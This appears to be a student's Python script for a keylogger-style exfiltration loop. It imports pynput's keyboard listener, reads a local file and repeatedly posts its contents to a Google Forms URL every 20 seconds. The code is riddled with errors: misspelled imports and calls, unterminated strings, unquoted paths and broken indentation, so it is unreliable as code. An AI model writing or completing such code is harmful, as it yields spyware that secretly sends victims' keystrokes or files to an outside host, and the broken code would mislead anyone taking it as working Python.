#!/usr/bin/env python3

import request
import time
import os
from pynput.keyboard import Listner

startlog = time.time()

os.system("python3 /home/student/Desktop/scripts/)
time.sleep(1)

def send_request():
	form_input = open(/home/student/ITP270_001N_FALL2022)
	form_send = form_input.read() 
	url= 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdiMHViuoPlW3UujN2b0M3xiT81aKGeEp779j46XlD58PzZ1A/formResponse' 
	form_data = {'entry.2005620554': f"'{form_send}'"} 
	r = requests.post(url, data=form_data) 
	
def interval():
	global startlog
	if time.tome() - 20 > startlog:
		print('Its been 20 secs')
		send_request()
		startlog = time.time()
		
counter = 0
while True:
counter+= 1 
print(counter) 
interval() 
time.sleep(l)
